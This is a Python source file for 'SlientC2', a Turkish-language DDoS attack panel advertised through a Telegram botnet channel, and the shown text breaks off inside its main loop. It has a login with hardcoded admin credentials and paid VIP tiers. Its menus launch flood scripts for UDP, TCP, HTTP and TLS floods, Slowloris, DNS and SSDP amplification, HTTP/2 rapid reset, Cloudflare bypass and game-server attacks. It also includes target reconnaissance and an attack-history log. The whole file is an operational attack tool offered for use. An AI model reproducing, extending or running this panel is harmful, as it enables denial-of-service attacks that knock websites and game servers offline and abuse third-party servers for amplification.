#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 - Temiz ve Düzenli Versiyon

import os
import sys
import time
import subprocess
import getpass
import random
import datetime
import json
import signal
import socket
import requests
import whois
from urllib.parse import urlparse
from colorama import Fore, init, Style, Back

init(autoreset=True)

if os.name == 'nt':
    os.system("chcp 65001 > nul")
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# ========== AKTİF PROSESLER ==========
active_processes = []

# ========== VIP SİSTEMİ ==========
VIP_FILE = "vip_users.json"
ADMIN_USER = "Zeldy"
ADMIN_PASS = "admin123"
CURRENT_USER = None
IS_VIP = False

def load_vip_users():
    try:
        with open(VIP_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"vip_users": []}

def save_vip_users(data):
    with open(VIP_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ========== 8 RENK TEMASI ==========
TEMALAR = {
    1: {"isim": "Varsayılan (Mavi-Mor)", "palet": [255, 254, 253, 117, 81, 45, 39, 45, 81, 117, 153, 189, 255]},
    2: {"isim": "Kırmızı-Turuncu", "palet": [196, 202, 208, 214, 220, 226, 220, 214, 208, 202, 196]},
    3: {"isim": "Yeşil-Açık Yeşil", "palet": [46, 82, 118, 154, 190, 226, 190, 154, 118, 82, 46]},
    4: {"isim": "Sarı-Beyaz", "palet": [226, 229, 231, 255, 231, 229, 226]},
    5: {"isim": "Pembe-Mor", "palet": [206, 212, 218, 224, 230, 236, 230, 224, 218, 212, 206]},
    6: {"isim": "Mavi-Gökyüzü", "palet": [33, 69, 105, 141, 177, 213, 177, 141, 105, 69, 33]},
    7: {"isim": "Gri-Beyaz (Sade)", "palet": [244, 246, 248, 250, 252, 254, 252, 250, 248, 246, 244]},
    8: {"isim": "Kırmızı-Beyaz", "palet": [160, 196, 203, 210, 217, 224, 231]}
}

mevcut_tema = 1
line_palette = TEMALAR[mevcut_tema]["palet"].copy()

def tema_degistir(tema_no):
    global mevcut_tema, line_palette
    if tema_no in TEMALAR:
        mevcut_tema = tema_no
        line_palette = TEMALAR[tema_no]["palet"].copy()
        return True
    return False

# ========== RENK FONKSİYONU (Tek renk - kutular bozulmasın) ==========
def tool_color():
    """Tool temasının ana rengini döndür"""
    return f"\033[38;5;{line_palette[0] if line_palette else 196}m"

def tool_color2():
    """Tool temasının ikincil rengini döndür"""
    idx = len(line_palette) // 2 if line_palette else 51
    return f"\033[38;5;{line_palette[idx]}m"

def rst():
    return "\033[0m"

# ========== SALDIRI GEÇMİŞİ ==========
HISTORY_FILE = "attack_history.json"

def history_ekle(target, port, duration, method, threads):
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        history = []
    entry = {
        "tarih": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hedef": target,
        "port": port,
        "sure": duration,
        "metod": method,
        "thread": threads,
        "kullanici": CURRENT_USER
    }
    history.append(entry)
    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def history_listele():
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return
    if not history:
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return
    c = tool_color()
    r = rst()
    print(f"\n{c}╔══════════════════════════════════════════════════════════╗{r}")
    print(f"{c}║                     SALDIRI GEÇMİŞİ                      ║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════╣{r}")
    for i, entry in enumerate(history[-20:], 1):
        user = entry.get('kullanici', 'N/A')
        line = f"  {i}. [{entry['tarih']}] {entry['metod']} -> {entry['hedef']} ({entry['sure']}s) [{user}]"
        print(f"{c}║ {line[:56].ljust(56)} ║{r}")
    print(f"{c}╚══════════════════════════════════════════════════════════╝{r}\n")

# ========== LOGO ==========
def show_logo():
    os.system('clear')
    c = tool_color()
    r = rst()
    print(f"{c}         ╔═╗ ╦   ╦ ╔═╗ ╔╗╔ ╔╦╗{r}")
    print(f"{c}         ╚═╗ ║   ║ ║╣  ║║║  ║ {r}")
    print(f"{c}         ╚═╝ ╚═╝ ╩ ╚═╝ ╝╚╝  ╩ {r}")
    print()
    print(f"{c}    ╔════════════════════════════════════╗{r}")
    print(f"{c}    ║        DdoS Attack Tool            ║{r}")
    print(f"{c}    ║      Telegram: @SlientBotnet       ║{r}")
    print(f"{c}    ╚════════════════════════════════════╝{r}")
    print()
    print(f"{c}    ╔════════════════════════════════════╗{r}")
    print(f"{c}    ║    write 'help' for usage          ║{r}")
    print(f"{c}    ╚════════════════════════════════════╝{r}")
    print()
    user_status = "VIP" if IS_VIP else "NORMAL"
    print(f"[!] Kullanıcı: {CURRENT_USER} ({user_status})")
    print("[!] 'menu' ile tüm methodları gör.")
    print("[!] 'stop' ile tüm saldırıları durdur.\n")

# ========== LOGIN ==========
def login():
    global CURRENT_USER, IS_VIP
    os.system('clear')
    c = tool_color()
    r = rst()
    print(f"{c}    ╔═════════════════════════════════════╗{r}")
    print(f"{c}    ║      Slient DdoS Login              ║{r}")
    print(f"{c}    ║   For the password: t.me/SlientBotnet║{r}")
    print(f"{c}    ╚═════════════════════════════════════╝{r}")
    print()
    username = input("Username:  ").strip()
    password = getpass.getpass("password: ").strip()

    # Admin
    if username == ADMIN_USER and password == ADMIN_PASS:
        CURRENT_USER = username
        IS_VIP = True
        return True

    # VIP kontrolü
    data = load_vip_users()
    for u in data.get("vip_users", []):
        if u.get("username") == username and u.get("password") == password:
            CURRENT_USER = username
            IS_VIP = True
            return True

    # Guest
    if username and password:
        CURRENT_USER = username
        IS_VIP = False
        return True

    print("\n[!] Kullanıcı adı veya şifre boş olamaz!")
    time.sleep(2)
    return False

# ========== PROMPT ==========
PROMPT_STYLE = 1
PROMPT_COLOR = "white"

COLOR_MAP = {
    "black": Fore.BLACK, "red": Fore.RED, "green": Fore.GREEN,
    "yellow": Fore.YELLOW, "blue": Fore.BLUE, "magenta": Fore.MAGENTA,
    "cyan": Fore.CYAN, "white": Fore.WHITE
}

def prompt():
    if PROMPT_STYLE == 1:
        c = COLOR_MAP.get(PROMPT_COLOR, Fore.WHITE)
        print(f"{c}┌──[SlientC2] - [SlientC2/root]{rst()}")
        print(f"{c}└─➤  {rst()}", end="")
        sys.stdout.flush()
        return input()
    elif PROMPT_STYLE == 2:
        c = COLOR_MAP.get(PROMPT_COLOR, Fore.WHITE)
        print(f"{c}┌──[SlientC2] - [SlientC2/root]{rst()}")
        print(f"{c}└─ $ {rst()}", end="")
        sys.stdout.flush()
        return input()
    else:
        print("┌──[SlientC2] - [SlientC2/root]")
        print("└─➤  ", end="")
        return input()

# ========== MENÜ ==========
def cmd_menu():
    os.system('clear')
    c = tool_color()
    c2 = tool_color2()
    r = rst()

    print(f"{c}╔══════════════════════════════════════════════════════════════════╗{r}")
    print(f"{c}║{c2}                    SLIENT C2 - METHOD PANEL                      {c}║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════════════╣{r}")
    status = "VIP" if IS_VIP else "NORMAL"
    print(f"{c}║  Kullanıcı: {CURRENT_USER:<20} Durum: {status:<25}║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════════════╣{r}")

    print(f"{c}║{c2} [ LAYER 7 ]                                                      {c}║{r}")
    print(f"{c}║  httpflood .... <url> <thread> <get/post> <time>         [DEFL]  ║{r}")
    print(f"{c}║  cfpro ........ <url> <thread> <time>                    [VIP]   ║{r}")
    print(f"{c}║  flood ........ <url> <time> <thread>                    [DEFL]  ║{r}")
    print(f"{c}║  http-raw ..... <url> <time>                             [DEFL]  ║{r}")
    print(f"{c}║  http-socket .. <url> <thread> <time>                    [DEFL]  ║{r}")
    print(f"{c}║  http-rand .... <url> <time>                             [DEFL]  ║{r}")
    print(f"{c}║  https-spoof .. <url> <time> <thread>                    [DEFL]  ║{r}")
    print(f"{c}║  tls .......... <url> <time> <thread>                    [DEFL]  ║{r}")
    print(f"{c}║  tls2 ......... <url> <time> <thread>                    [DEFL]  ║{r}")
    print(f"{c}║  tls3 ......... <url> <time> <thread>                    [DEFL]  ║{r}")
    print(f"{c}║  httpflood2 ... <url> <time>                             [VIP]   ║{r}")
    print(f"{c}║  slow ......... <url> <time>                             [DEFL]  ║{r}")
    print(f"{c}║  rapid ........ <url> <time> <thread>                    [VIP]   ║{r}")
    print(f"{c}║  uambypass .... <url> <time> <thread>                    [VIP]   ║{r}")
    print(f"{c}║  httpsbypass .. <url> <time> <thread>                    [VIP]   ║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════════════╣{r}")

    print(f"{c}║{c2} [ LAYER 4 ]                                                      {c}║{r}")
    print(f"{c}║  udp .......... <ip> <port> <time>                       [DEFL]  ║{r}")
    print(f"{c}║  tcpflood ..... <ip> <port> <thread> <time> <pps> <flag> [VIP]   ║{r}")
    print(f"{c}║  dnsamp ....... <ip/url> <time> <thread>                 [VIP]   ║{r}")
    print(f"{c}║  ssdp ......... <ip> <time> <thread>                     [VIP]   ║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════════════╣{r}")

    print(f"{c}║{c2} [ GAME ]                                                         {c}║{r}")
    print(f"{c}║  fortnite ..... <ip> <port> <time> <pps> <payload>       [DEFL]  ║{r}")
    print(f"{c}║  fivem ........ <ip> <time>                              [DEFL]  ║{r}")
    print(f"{c}║  minecraft .... <ip> <port> <time>                       [VIP]   ║{r}")
    print(f"{c}║  browser ...... <url> <time>                             [VIP]   ║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════════════╣{r}")

    print(f"{c}║{c2} [ EXTRA ]                                                        {c}║{r}")
    print(f"{c}║  info ......... <ip/url>                                 [DEFL]  ║{r}")
    print(f"{c}║  promptstyle .. <1|2>                                    [DEFL]  ║{r}")
    print(f"{c}║  promptcolor .. <renk>                                   [DEFL]  ║{r}")
    print(f"{c}║  theme ........ <1-8>                                    [DEFL]  ║{r}")
    print(f"{c}║  history ......                                          [DEFL]  ║{r}")
    print(f"{c}║  stop .........                                          [DEFL]  ║{r}")
    if CURRENT_USER == ADMIN_USER:
        print(f"{c}║  addvip ....... <user> <pass>                            [ADMIN] ║{r}")
        print(f"{c}║  delvip ....... <user>                                   [ADMIN] ║{r}")
        print(f"{c}║  listvip ......                                          [ADMIN] ║{r}")
    print(f"{c}╚══════════════════════════════════════════════════════════════════╝{r}")
    print()

# ========== VIP KONTROL ==========
def check_vip(method_name):
    if IS_VIP:
        return True
    print(f"\n[!] '{method_name}' methodu VIP gerektirir!")
    print("[!] VIP olmak için: t.me/SlientBotnet\n")
    return False

# ========== ATTACK BANNER ==========
def show_attack_banner(target, port, duration, method, threads=None):
    os.system('clear')
    c = tool_color()
    r = rst()
    now = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    method_upper = method.upper()

    print(f"{c}╔══════════════════════════════════════════════════════════╗{r}")
    print(f"{c}║                       ATTACK SENT                        ║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════╣{r}")
    print(f"{c}║  Target   : {target:<45}║{r}")
    print(f"{c}║  Port     : {port:<45}║{r}")
    print(f"{c}║  Method   : {method_upper:<45}║{r}")
    print(f"{c}║  Duration : {str(duration)+'s':<45}║{r}")
    if threads:
        print(f"{c}║  Threads  : {threads:<45}║{r}")
    print(f"{c}║  User     : {CURRENT_USER:<45}║{r}")
    print(f"{c}║  Time     : {now:<45}║{r}")
    print(f"{c}╚══════════════════════════════════════════════════════════╝{r}")
    print()

# ========== INFO ==========
def cmd_info(args):
    if len(args) < 1:
        print("[!] Kullanım: info <IP veya URL>")
        return
    target = args[0]
    show_attack_banner(target, "N/A", "0", "INFO", threads="Keşif")
    try:
        if target.startswith("http"):
            hostname = urlparse(target).hostname
        else:
            hostname = target
        ip = socket.gethostbyname(hostname)
        print(f"[+] IP Adresi: {ip}")
        print(f"[+] Hostname: {hostname}")
        geo = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
        print(f"\n[+] Konum:")
        print(f"    Ülke: {geo.get('country', 'N/A')}")
        print(f"    Şehir: {geo.get('city', 'N/A')}")
        print(f"    ISP: {geo.get('org', 'N/A')}")
        if target.startswith("http"):
            resp = requests.get(target, timeout=10, allow_redirects=True)
            print(f"\n[+] HTTP Durum: {resp.status_code}")
            print(f"    Server: {resp.headers.get('Server', 'N/A')}")
            if "cloudflare" in resp.headers.get("Server", "").lower() or resp.headers.get("CF-RAY"):
                print(f"    Cloudflare: EVET")
            else:
                print(f"    Cloudflare: HAYIR")
    except Exception as e:
        print(f"[!] Hata: {e}")
    print()

# ========== ÇALIŞTIRICILAR ==========
def run_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["python3", script_name] + args
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Hata: {e}")

def run_go_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["go", "run", script_name] + args
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'go' komutu bulunamadı.")

def run_node_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["node", script_name] + args
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'node' komutu bulunamadı.")

def run_c_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        if os.path.exists("tcp.c"):
            try:
                subprocess.run(["gcc", "tcp.c", "-o", binary_name, "-lpthread"], check=True)
            except:
                print("[!] Derleme hatası.")
                return
        else:
            print(f"[!] {binary_name} ve tcp.c bulunamadı!")
            return
    cmd = ["./" + binary_name] + args
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Hata: {e}")

def run_perl_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["perl", script_name] + args
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'perl' komutu bulunamadı.")

def run_go_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        gofile = None
        for f in ["minecraft.go", "rapid.go"]:
            if os.path.exists(f):
                gofile = f
                break
        if gofile:
            try:
                subprocess.run(["go", "build", "-o", binary_name, gofile], check=True)
            except:
                print("[!] Derleme hatası.")
                return
        else:
            print(f"[!] {binary_name} ve .go bulunamadı!")
            return
    cmd = ["./" + binary_name] + args
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Hata: {e}")

# ========== STOP ==========
def cmd_stop():
    global active_processes
    killed = 0
    for proc in active_processes:
        try:
            proc.terminate()
            killed += 1
        except:
            pass
    active_processes.clear()
    try:
        for pattern in ["node", "udp.py|cf-pro.py|fortnite.py|dnsamp.py|ssdp.py",
                        "httpflood.go|rapid", "tcpflood", "fivem.pl", "browser.js",
                        "minecraft", "uambypass.js"]:
            result = subprocess.run(["pgrep", "-f", pattern], capture_output=True, text=True)
            if result.stdout:
                for pid in result.stdout.strip().split('\n'):
                    try:
                        os.kill(int(pid), signal.SIGTERM)
                        killed += 1
                    except:
                        pass
    except:
        pass
    if killed > 0:
        print(f"[+] {killed} proses sonlandırıldı.")
    else:
        print("[!] Çalışan proses yok.")

# ========== METOD KOMUTLARI ==========
def cmd_udp(args):
    if len(args) < 3:
        print("[!] udp <ip> <port> <süre>")
        return
    show_attack_banner(args[0], args[1], args[2], "UDP", "2048")
    history_ekle(args[0], args[1], args[2], "UDP", "2048")
    run_script("udp.py", [args[0], args[1], args[2]])

def cmd_httpflood(args):
    if len(args) < 4:
        print("[!] httpflood <url> <threads> <get/post> <seconds> [header]")
        return
    header = args[4] if len(args) > 4 else "nil"
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[3], "HTTP-FLOOD", args[1])
    history_ekle(args[0], port, args[3], "HTTP-FLOOD", args[1])
    run_go_script("httpflood.go", [args[0], args[1], args[2].lower(), args[3], header])

def cmd_cfpro(args):
    if not check_vip("cfpro"): return
    if len(args) < 3:
        print("[!] cfpro <url> <threads> <seconds>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[2], "CF-PRO", args[1])
    history_ekle(args[0], port, args[2], "CF-PRO", args[1])
    if not os.path.exists("cf-pro.py"):
        print("[!] cf-pro.py bulunamadı!")
        return
    run_script("cf-pro.py", [args[0], args[1], args[2]])

def cmd_flood(args):
    if len(args) < 3:
        print("[!] flood <url> <süre> <thread>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "FLOOD", args[2])
    history_ekle(args[0], port, args[1], "FLOOD", args[2])
    if not os.path.exists("proxy.txt"):
        open("proxy.txt", "w").close()
    run_node_script("flood.js", [args[0], args[1], args[2], args[2], "proxy.txt"])

def cmd_httpraw(args):
    if len(args) < 2:
        print("[!] http-raw <url> <süre>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "HTTP-RAW")
    history_ekle(args[0], port, args[1], "HTTP-RAW", "1")
    run_node_script("HTTP-RAW.js", [args[0], args[1]])

def cmd_httpsocket(args):
    if len(args) < 3:
        print("[!] http-socket <url> <thread> <süre>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[2], "HTTP-SOCKET", args[1])
    history_ekle(args[0], port, args[2], "HTTP-SOCKET", args[1])
    run_node_script("HTTP-SOCKET.js", [args[0], args[1], args[2]])

def cmd_httprand(args):
    if len(args) < 2:
        print("[!] http-rand <url> <süre>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "HTTP-RAND")
    history_ekle(args[0], port, args[1], "HTTP-RAND", "1")
    run_node_script("HTTP-RAND.js", [args[0], args[1]])

def cmd_httpspoof(args):
    if len(args) < 3:
        print("[!] https-spoof <url> <süre> <thread>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "HTTPS-SPOOF", args[2])
    history_ekle(args[0], port, args[1], "HTTPS-SPOOF", args[2])
    run_script("https-spoof.py", [args[0], args[1], args[2]])

def cmd_tls(args):
    if len(args) < 3:
        print("[!] tls <url> <süre> <thread>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "TLS", args[2])
    history_ekle(args[0], port, args[1], "TLS", args[2])
    if not os.path.exists("proxy.txt"):
        open("proxy.txt", "w").close()
    run_node_script("tls.js", [args[0], args[1], args[2], "GET", "proxy.txt", args[2]])

def cmd_tls2(args):
    if len(args) < 3:
        print("[!] tls2 <url> <süre> <thread>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "TLS2", args[2])
    history_ekle(args[0], port, args[1], "TLS2", args[2])
    run_node_script("tls-proxy.js", [args[0], args[1], args[2]])

def cmd_tls3(args):
    if len(args) < 3:
        print("[!] tls3 <url> <süre> <thread>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "TLS3", args[2])
    history_ekle(args[0], port, args[1], "TLS3", args[2])
    run_node_script("tls3.js", [args[0], args[1], args[2]])

def cmd_httpflood2(args):
    if not check_vip("httpflood2"): return
    if len(args) < 2:
        print("[!] httpflood2 <url> <süre>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "HTTP-FLOOD2", "Proxy")
    history_ekle(args[0], port, args[1], "HTTP-FLOOD2", "Proxy")
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt bulunamadı!")
        return
    run_node_script("httpflood2.js", [args[0], args[1]])

def cmd_slow(args):
    if len(args) < 2:
        print("[!] slow <url> <süre>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "SLOW", "Slowloris")
    history_ekle(args[0], port, args[1], "SLOW", "Slowloris")
    run_node_script("slow.js", [args[0], args[1]])

def cmd_tcpflood(args):
    if not check_vip("tcpflood"): return
    if len(args) < 6:
        print("[!] tcpflood <IP> <PORT> <THREAD> <TIME> <PPS> <FLAG>")
        return
    show_attack_banner(args[0], args[1], args[3], "TCP-FLOOD", args[2])
    history_ekle(args[0], args[1], args[3], "TCP-FLOOD", args[2])
    run_c_binary("tcpflood", [args[0], args[1], args[2], args[3], args[4], args[5]])

def cmd_fortnite(args):
    if len(args) < 5:
        print("[!] fortnite <IP> <PORT> <SÜRE> <PPS> <PAYLOAD>")
        return
    show_attack_banner(args[0], args[1], args[2], "FORTNITE", args[3])
    history_ekle(args[0], args[1], args[2], "FORTNITE", args[3])
    run_script("fortnite.py", [args[0], args[1], args[2], args[3], args[4]])

def cmd_fivem(args):
    if len(args) < 2:
        print("[!] fivem <IP> <SÜRE>")
        return
    show_attack_banner(args[0], "30120", args[1], "FIVEM", "Perl")
    history_ekle(args[0], "30120", args[1], "FIVEM", "Perl")
    run_perl_script("fivem.pl", [args[0], args[1]])

def cmd_browser(args):
    if not check_vip("browser"): return
    if len(args) < 2:
        print("[!] browser <URL> <SÜRE>")
        return
    port = "443" if args[0].startswith("https") else "80"
    show_attack_banner(args[0], port, args[1], "BROWSER", "1250")
    history_ekle(args[0], port, args[1], "BROWSER", "1250")
    if not os.path.exists("proxy.txt"):
        open("proxy.txt", "w").close()
    run_node_script("browser.js", [args[0], args[1], "1250", "proxy.txt"])

def cmd_minecraft(args):
    if not check_vip("minecraft"): return
    if len(args) < 3:
        print("[!] minecraft <IP> <PORT> <SÜRE>")
        return
    show_attack_banner(args[0], args[1], args[2], "MINECRAFT", "1000")
    history_ekle(args[0], args[1], args[2], "MINECRAFT", "1000")
    run_go_binary("minecraft", [args[0], args[1], args[2]])

def cmd_dnsamp(args):
    if not check_vip("dnsamp"): return
    if len(args) >= 2:
        target, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] DNS Amplification")
        target = input("  Hedef: ").strip()
        if not target: return
        duration = input("  Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  Thread (500): ").strip()
        if not threads.isdigit(): threads = "500"
    show_attack_banner(target, "53", duration, "DNS-AMP", threads)
    history_ekle(target, "53", duration, "DNS-AMP", threads)
    run_script("dnsamp.py", [target, duration, threads])

def cmd_ssdp(args):
    if not check_vip("ssdp"): return
    if len(args) >= 2:
        target, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] SSDP Amplification")
        target = input("  Hedef IP: ").strip()
        if not target: return
        duration = input("  Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  Thread (500): ").strip()
        if not threads.isdigit(): threads = "500"
    show_attack_banner(target, "1900", duration, "SSDP-AMP", threads)
    history_ekle(target, "1900", duration, "SSDP-AMP", threads)
    run_script("ssdp.py", [target, duration, threads])

def cmd_rapid(args):
    if not check_vip("rapid"): return
    if len(args) >= 2:
        url, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] HTTP/2 Rapid Reset")
        url = input("  Hedef URL: ").strip()
        if not url: return
        if not url.startswith("http"): url = "https://" + url
        duration = input("  Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  Thread (500): ").strip()
        if not threads.isdigit(): threads = "500"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "H2-RESET", threads)
    history_ekle(url, port, duration, "H2-RESET", threads)
    run_go_binary("rapid", [url, duration, threads])

def cmd_uambypass(args):
    if not check_vip("uambypass"): return
    if len(args) >= 2:
        url, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "50"
        proxy_file = args[3] if len(args) > 3 else "proxy.txt"
    else:
        print("\n[?] User-Agent Bypass")
        url = input("  Hedef URL: ").strip()
        if not url: return
        if not url.startswith("http"): url = "http://" + url
        duration = input("  Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  Thread (50): ").strip()
        if not threads.isdigit(): threads = "50"
        proxy_file = "proxy.txt"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "UABYPASS", threads)
    history_ekle(url, port, duration, "UABYPASS", threads)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w") as f:
            f.write("1.1.1.1:8080\n2.2.2.2:8080")
    run_node_script("uambypass.js", [url, duration, threads, proxy_file])

def cmd_httpsbypass(args):
    if not check_vip("httpsbypass"): return
    if len(args) >= 2:
        url, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "100"
    else:
        print("\n[?] HTTPS Bypass")
        url = input("  Hedef URL: ").strip()
        if not url: return
        if not url.startswith("http"): url = "http://" + url
        duration = input("  Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  Thread (100): ").strip()
        if not threads.isdigit(): threads = "100"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTPSBYPASS", threads)
    history_ekle(url, port, duration, "HTTPSBYPASS", threads)
    proxy_file = "proxy.txt"
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w") as f:
            f.write("1.1.1.1:8080\n2.2.2.2:8080")
    run_node_script("uambypass.js", [url, duration, threads, proxy_file])

# ========== THEME + PROMPT ==========
def cmd_theme(args):
    if len(args) < 1:
        print("\nMevcut Temalar:")
        for no, t in TEMALAR.items():
            aktif = " (Aktif)" if no == mevcut_tema else ""
            print(f"  {no}: {t['isim']}{aktif}")
        print("Kullanım: theme <1-8>")
        return
    try:
        no = int(args[0])
        if tema_degistir(no):
            print(f"[+] Tema: {TEMALAR[no]['isim']}")
            show_logo()
        else:
            print("[!] Geçersiz tema (1-8)")
    except ValueError:
        print("[!] Sayı girin.")

def cmd_promptstyle(args):
    global PROMPT_STYLE
    if len(args) < 1:
        print("[!] promptstyle <1|2>")
        print("  1 = ┌──[SlientC2] / └─➤")
        print("  2 = ┌──[SlientC2] / └─ $")
        return
    try:
        s = int(args[0])
        if s in (1, 2):
            PROMPT_STYLE = s
            print(f"[+] Prompt stili {s}")
        else:
            print("[!] 1 veya 2 girin.")
    except ValueError:
        print("[!] Sayı girin.")

def cmd_promptcolor(args):
    global PROMPT_COLOR
    valid = ["black","red","green","yellow","blue","magenta","cyan","white"]
    if len(args) < 1:
        print("[!] promptcolor <renk>")
        print(f"    Renkler: {', '.join(valid)}")
        return
    c = args[0].lower()
    if c not in valid:
        print(f"[!] Geçersiz renk: {c}")
        return
    PROMPT_COLOR = c
    print(f"[+] Prompt rengi: {c}")

# ========== ADMIN ==========
def cmd_addvip(args):
    if CURRENT_USER != ADMIN_USER:
        print("[!] Admin gerekli!")
        return
    if len(args) < 2:
        print("[!] addvip <user> <pass>")
        return
    data = load_vip_users()
    for u in data["vip_users"]:
        if u["username"] == args[0]:
            u["password"] = args[1]
            save_vip_users(data)
            print(f"[+] VIP güncellendi: {args[0]}")
            return
    data["vip_users"].append({"username": args[0], "password": args[1]})
    save_vip_users(data)
    print(f"[+] VIP eklendi: {args[0]}")

def cmd_delvip(args):
    if CURRENT_USER != ADMIN_USER:
        print("[!] Admin gerekli!")
        return
    if len(args) < 1:
        print("[!] delvip <user>")
        return
    data = load_vip_users()
    olen = len(data["vip_users"])
    data["vip_users"] = [u for u in data["vip_users"] if u["username"] != args[0]]
    if len(data["vip_users"]) < olen:
        save_vip_users(data)
        print(f"[+] VIP silindi: {args[0]}")
    else:
        print(f"[!] Bulunamadı: {args[0]}")

def cmd_listvip(args):
    if CURRENT_USER != ADMIN_USER:
        print("[!] Admin gerekli!")
        return
    data = load_vip_users()
    print(f"\n[+] VIP Kullanıcılar ({len(data['vip_users'])}):")
    for i, u in enumerate(data["vip_users"], 1):
        print(f"    {i}. {u['username']} / {u['password']}")
    print()

# ========== HELP ==========
def cmd_help():
    os.system('clear')
    c = tool_color()
    c2 = tool_color2()
    r = rst()
    print(f"{c}╔══════════════════════════════════════════════════════════╗{r}")
    print(f"{c}║{c2}                    SLIENT C2 HELP                        {c}║{r}")
    print(f"{c}╠══════════════════════════════════════════════════════════╣{r}")
    print(f"{c}║  menu          - Tüm methodları göster                   ║{r}")
    print(f"{c}║  L7 / L4 / game - Method menüsü                          ║{r}")
    print(f"{c}║  info          - Hedef bilgisi                           ║{r}")
    print(f"{c}║  promptstyle   - Prompt stili (1|2)                      ║{r}")
    print(f"{c}║  promptcolor   - Prompt rengi                            ║{r}")
    print(f"{c}║  theme         - Tema (1-8)                              ║{r}")
    print(f"{c}║  history       - Saldırı geçmişi                         ║{r}")
    print(f"{c}║  stop          - Tüm saldırıları durdur                  ║{r}")
    print(f"{c}║  clear         - Ekranı temizle                          ║{r}")
    if CURRENT_USER == ADMIN_USER:
        print(f"{c}║  addvip        - VIP ekle                                ║{r}")
        print(f"{c}║  delvip        - VIP sil                                 ║{r}")
        print(f"{c}║  listvip       - VIP listesi                             ║{r}")
    print(f"{c}║  exit          - Çıkış                                   ║{r}")
    print(f"{c}╚══════════════════════════════════════════════════════════╝{r}\n")

# ========== MAIN ==========
def main():
    if not login():
        return
    show_logo()
    try:
        while True:
            raw = prompt().strip()
            if not raw:
                continue
            parts = raw.split()
